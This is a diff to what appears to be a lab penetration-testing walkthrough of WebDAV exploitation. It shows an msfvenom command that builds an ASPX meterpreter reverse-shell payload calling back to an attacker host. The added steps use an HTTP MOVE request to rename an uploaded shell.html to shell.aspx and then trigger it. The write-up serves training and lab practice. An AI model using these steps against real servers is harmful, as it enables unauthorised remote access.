@@ -64,3 +64,19 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.49 LPORT=443 -f aspx
 ```
 
 ![Davtest-07](https://github.com/billburn/penetration-testing/blob/master/Webdav/Images/davtest-07.png)
+
+## MOVING the .html to .aspx to complete the Reverse Shell
+
+```
+1) Back in the repeater tab Manipulate the HTTP Method from PUT to MOVE
+1a) PUT /shell.html
+2) Add a new line underneath PUT with:
+2a) Destination: /shell.aspx
+```
+
+![Davtest-08](https://github.com/billburn/penetration-testing/blob/master/Webdav/Images/davtest-08.png)
+
+## Browse to http://10.10.10.15/shell.aspx
+
+
+![Davtest-09](https://github.com/billburn/penetration-testing/blob/master/Webdav/Images/davtest-09.png)
